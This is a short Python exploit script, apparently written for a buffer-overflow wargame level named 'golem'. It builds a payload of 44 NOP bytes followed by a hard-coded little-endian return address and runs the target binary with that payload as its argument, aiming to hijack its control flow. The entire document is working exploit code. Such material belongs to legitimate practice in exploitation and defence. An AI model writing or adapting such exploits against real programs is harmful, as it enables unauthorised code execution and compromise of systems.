import os
from struct import *

p = lambda x : pack("<L",x)


target="/home/skeleton/golem"
ret = 0xbffff590
limit = 44



payload = "\x90"*44+p(ret)

os.execv(target,[target,payload])
